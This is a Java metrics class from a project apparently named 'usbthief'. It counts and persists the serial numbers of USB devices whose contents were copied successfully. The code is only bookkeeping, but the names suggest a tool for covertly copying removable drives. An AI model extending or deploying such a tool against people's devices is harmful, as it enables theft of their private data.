package com.superredrock.usbthief.statistics.collector;

import com.superredrock.usbthief.core.event.EventBus;
import com.superredrock.usbthief.core.event.worker.CopyCompletedEvent;

import java.util.Arrays;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicLong;

public final class TotalDevicesCopiedCollector implements MetricCollector {
    public static final String ID = "devices.copied";
    private static final String KEY_COUNT = "totalDevicesCopied";
    private static final String KEY_SERIALS = "deviceSerials";
    private final AtomicLong counter = new AtomicLong(0);
    private final ConcurrentHashMap.KeySetView<String, Boolean> serials = ConcurrentHashMap.newKeySet();

    public TotalDevicesCopiedCollector() {
        EventBus.getInstance().register(CopyCompletedEvent.class, this::onCopyCompleted);
    }

    private void onCopyCompleted(CopyCompletedEvent event) {
        if (!event.isSuccess()) return;
        String serial = event.deviceSerial();
        if (!serial.isEmpty() && serials.add(serial)) {
            counter.incrementAndGet();
        }
    }

    @Override public String getId() { return ID; }
    @Override public MetricSnapshot snapshot() { return new MetricSnapshot(ID, counter.get()); }
    @Override public boolean isPersistent() { return true; }

    @Override
    public void load(MetricStore store) {
        counter.set(store.getLong(KEY_COUNT).orElse(0));
        store.getString(KEY_SERIALS).ifPresent(s -> {
            if (!s.isEmpty()) {
                serials.addAll(Arrays.asList(s.split(",")));
            }
        });
    }

    @Override
    public void save(MetricStore store) {
        store.put(KEY_COUNT, counter.get());
        store.put(KEY_SERIALS, String.join(",", serials));
    }

    @Override
    public void reset() {
        counter.set(0);
        serials.clear();
    }

    public int getCopiedDeviceCount() {
        return serials.size();
    }
}
